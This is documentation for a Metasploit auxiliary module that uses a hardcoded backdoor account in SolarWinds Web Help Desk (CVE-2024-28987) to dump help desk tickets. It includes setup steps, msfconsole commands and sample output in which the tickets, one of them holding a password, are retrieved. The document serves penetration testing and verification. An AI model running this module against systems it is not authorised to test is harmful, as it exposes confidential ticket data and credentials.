## Vulnerable Application

This module exploits a backdoor in SolarWinds Web Help Desk <= v12.8.3 (CVE-2024-28987) to retrieve all tickets from the system.

## Testing

The software can be obtained from
[the vendor](https://downloads.solarwinds.com/solarwinds/Release/WebHelpDesk/12.8.1/WebHelpDesk-12.8.1-x64_eval.exe).

Installation instructions are available [here]
(https://documentation.solarwinds.com/en/success_center/whd/content/whd_installation_guide.htm).

**Successfully tested on**

- SolarWinds Web Help Desk v12.8.1 on Windows 22H2

## Verification Steps

1. Install and run the application
2. Start `msfconsole` and run the following commands:

```
msf6 > use auxiliary/gather/solarwinds_webhelpdesk_backdoor 
msf6 auxiliary(gather/solarwinds_webhelpdesk_backdoor) > set RHOSTS <IP>
msf6 auxiliary(gather/solarwinds_webhelpdesk_backdoor) > run
```

This should return all the tickets from the Web Help Desk platform.

## Options

### TICKET_COUNT
The number of tickets to dump to the terminal.

## Scenarios

Running the exploit against Web Help Desk v12.8.1 on Windows 22H2 should result in an output similar to the following:

```
msf6 auxiliary(gather/solarwinds_webhelpdesk_backdoor) > run
[*] Running module against 192.168.217.145

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Authenticating with the backdoor account "helpdeskIntegrationUser"...
[+] Successfully authenticated and tickets retrieved. Displaying the first 2 tickets retrieved:
[+] [
  {
    "id": 2,
    "type": "Ticket",
    "lastUpdated": "2024-09-25T08:54:13Z",
    "shortSubject": "Password reset",
    "shortDetail": "Hi,\r\n\r\nhere is your super secure password: foo\r\n\r\nYour IT Support",
    "displayClient": "No Client",
    "updateFlagType": 2,
    "prettyLastUpdated": "13 hours ago",
    "latestNote": null
  },
  {
    "id": 1,
    "type": "Ticket",
    "lastUpdated": "2024-09-25T05:15:17Z",
    "shortSubject": "Welcome to Web Help Desk",
    "shortDetail": "Congratulations! You have successfully installed Web Help Desk. Further configuration options are...",
    "displayClient": "Demo Client",
    "updateFlagType": 2,
    "prettyLastUpdated": "17 hours ago",
    "latestNote": null
  }
]
[+] Saved 2 tickets to /home/asdf/.msf4/loot/20240926004744_default_unknown_solarwinds_webhe_825328.txt
[*] Auxiliary module execution completed
```
